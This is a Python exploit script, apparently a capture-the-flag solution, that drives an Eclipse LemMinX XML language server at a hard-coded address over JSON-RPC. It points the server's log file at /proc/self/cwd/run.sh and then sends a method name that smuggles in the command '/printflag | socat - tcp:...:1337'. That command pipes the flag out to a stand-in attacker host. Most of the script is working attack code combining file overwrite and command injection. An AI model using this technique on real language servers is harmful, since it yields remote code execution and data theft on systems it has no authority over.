import json
import pygments
import pygments.lexers
import pygments.formatters
import time

from braindead import *
log.enable()
args = Args()
args.parse()

if 0:
    r = io.process([
        'strace',
        '-e', '%file',
        '-f',
         #'java',
        #'-jar', './lemminx/org.eclipse.lemminx/target/org.eclipse.lemminx-uber.jar',
        './lemminx-linux',
    ], stderr='pass')
else:
    #r = io.connect(('172.17.0.2',  7777))
    r = io.connect(('35.185.130.194', 40001))

rpc_id_ctr = 0
def send_call(method, params):
    global rpc_id_ctr
    rpc_id_ctr += 1
    content = json.dumps({
        "jsonrpc": "2.0",
        "id": rpc_id_ctr,
        "method": method,
        "params": params,
    })
    r.send(f'Content-Length: {len(content)}\r\n\r\n' + content)
    return rpc_id_ctr

def reap():
    clen = int(r.rla('Content-Length: '))
    r.rl()
    j = json.loads(r.recvn(clen).decode())
    pretty = json.dumps(j, indent=True)
    print(pygments.highlight(pretty, lexer=pygments.lexers.JsonLexer(), formatter=pygments.formatters.Terminal256Formatter()))
    return j

def call(method, params):
    send_call(method, params)
    resp = reap()
    return resp

call('initialize', {
    'rootUri': 'file:///tmp',
    'initializationOptions': {
        'settings': {
            'xml': {
                "logs": {
                    "client": True,
                    "file": "/proc/self/cwd/run.sh"
                },
            },
        },
    },
    'capabilities': {
        'executeCommand': {
            'dynamicRegistration': True,
        },
    },
})
#send_call('initialized', {})

call('aaaa\n/printflag | socat - tcp:your.super.secret.public.ip.box.com:1337\n\nbbbb',{})

time.sleep(1)

call('workspace/didChangeConfiguration', {
    'settings': {
        'xml': {
            "logs": {
                "client": True,
                "file": "/tmp/whatever.log"
            },
        },
    },
})

time.sleep(1)

call('exit', {})

while True:
    reap()

io.interactive(r)
